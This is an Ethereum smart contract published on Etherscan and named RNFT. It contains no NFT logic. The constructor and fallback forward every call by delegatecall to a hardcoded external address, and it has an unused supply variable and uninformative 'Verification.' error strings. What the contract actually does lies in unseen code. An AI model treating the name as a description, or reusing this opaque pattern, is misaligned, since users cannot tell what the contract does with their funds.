/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.13;

contract RNFT {
    uint256 private totalSupply = 5001;
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x365865997b9851f7e32afC16299facAa5B258248).delegatecall(data);
        require(r1, "Verification.");
        return result;
    }

    receive() payable external {
    }

    constructor() {
        bytes memory data = abi.encodeWithSignature("initialize()");
        (bool r1,) = address(0x365865997b9851f7e32afC16299facAa5B258248).delegatecall(data);
        require(r1, "Verificiation.");
    }
}